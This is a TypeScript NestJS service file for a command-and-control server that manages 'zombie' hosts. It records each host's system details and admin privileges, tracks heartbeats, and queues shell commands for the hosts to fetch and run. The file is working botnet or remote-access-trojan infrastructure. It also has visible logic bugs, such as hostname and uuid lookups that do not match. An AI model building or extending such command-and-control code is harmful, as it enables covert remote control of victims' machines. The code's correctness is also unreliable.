// src/host/zombie.service.ts
import { Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { Host } from './entities/host.entity';
import { Command } from './entities/command.entity';
import { HeartbeetData } from './dto/HeartbeetData.dto';
import { SystemData } from './dto/system-data.dto';
import { ExecutedCommand } from './dto/executed-command.dto';

@Injectable()
export class ZombieService {
  constructor(
    @InjectRepository(Host)
    private hostRepo: Repository<Host>,

    @InjectRepository(Command)
    private commandRepo: Repository<Command>,
  ) {}

  async register(systemData: SystemData, clientIp: string, clientPort: number) {
    console.log(`INFO: Received register request from ${systemData.hostname} (IP: ${clientIp}:${clientPort})`);
  
    // Try to find an existing host
    let isZombieRegistered = await this.hostRepo.findOne({
      where: { uuid: systemData.uuid },
      relations: ['commands'],
    });

    const zombieData = {
      ...systemData,
      ...{ last_seen: Date.now() / 1000 }

    };
  
    if (!isZombieRegistered) {
      
      isZombieRegistered = this.hostRepo.create({
        ...zombieData,
        commands: [],
      });
      isZombieRegistered = await this.hostRepo.save(isZombieRegistered);
      console.log("INFO: Registered (New)");
    }
    // Check if any fields have changed and updating
    else {
      let fieldsChanged = false;
      for (const key in zombieData) {
        if (isZombieRegistered[key] !== zombieData[key]) {
          isZombieRegistered[key] = zombieData[key];
          fieldsChanged = true;
        }
      }

      if (fieldsChanged) {
        console.log("INFO: Registered (Updated)");
        isZombieRegistered = await this.hostRepo.save(isZombieRegistered);
      } 
      else {
        console.log("INFO: Registered (NoChange)");
      }
    }
  
    console.log(systemData);
  
    // If a command was executed, update the corresponding record
    // if (c2_data.exec?.result && c2_data.exec.result !== 'NO_EXEC') {
    //   const existingCmd = isZombieRegistered.commands.find((c) => c.command === c2_data.exec.command);
    //   if (existingCmd) {
    //     existingCmd.stdout = c2_data.exec.stdout;
    //     existingCmd.stderr = c2_data.exec.stderr;
    //     existingCmd.result = c2_data.exec.result;
    //     await this.commandRepo.save(existingCmd);
    //     console.log(`INFO: Updated command result for host ${isZombieRegistered.hostname}`);
    //   }
    // }
  }

  async heartbeet(zombieReceivedData: HeartbeetData, clientIp: string, clientPort: number) {
  
    // Try to find an existing host
    let currentZombie = await this.hostRepo.findOne({
      where: { uuid: zombieReceivedData.uuid },
      relations: ['commands'],
    })

    console.log(`INFO: Received heartbeat from ${zombieReceivedData.uuid} (Hostname: ${currentZombie?.hostname}) (IP: ${clientIp}:${clientPort})`);
    const zombieSaveData = {
      ...currentZombie,
      
    };
    zombieSaveData.last_seen = Date.now() / 1000
    await this.hostRepo.save(zombieSaveData);
  }
  
  async getPendingCommands(uuid: string) {
    const host = await this.hostRepo.findOne({
      where: { uuid: uuid },
      relations: ['commands'],
    });
    if (!host) {
      return [];
    }
    // Return commands where result is NO_EXEC
    return host.commands.filter((cmd) => cmd.result === 'NO_EXEC').map((cmd) => cmd.command);
  }

  async addCommand(hostname: string, commandStr: string) {
    let host = await this.hostRepo.findOne({ where: { hostname }, relations: ['commands'] });
    if (!host) {
      // If host doesn't exist, create it
      host = this.hostRepo.create({
        hostname,
        os_type: '',
        os_version: '',
        username: '',
        is_admin_user: false,
        is_admin_process: false,
        host_time: '',
        last_seen: Date.now() / 1000,
        commands: [],
      });
      await this.hostRepo.save(host);
    }
    const command = this.commandRepo.create({ command: commandStr, host });
    await this.commandRepo.save(command);

    // Return all the host's NO_EXEC commands
    return (await this.getPendingCommands(hostname));
  }

  async getHosts() {
    const hosts = await this.hostRepo.find();
    return hosts.map((h) => ({
      system_data: {
        hostname: h.hostname,
        os_type: h.os_type,
        os_version: h.os_version,
        username: h.username,
        is_admin_user: h.is_admin_user,
        is_admin_process: h.is_admin_process,
        host_time: h.host_time,
        // If you want to store interfaces in a separate entity, handle it here
        interfaces: [],
      },
      last_seen: h.last_seen,
    }));
  }

  // You could also implement a periodic cleanup that removes old host records:
  async cleanupInactiveHosts() {
    const currentTime = Date.now() / 1000;
    // This will remove hosts older than 10 seconds
    const cutoff = currentTime - 10;
    await this.hostRepo
      .createQueryBuilder()
      .delete()
      .from(Host)
      .where('last_seen < :cutoff', { cutoff })
      .execute();
  }
}
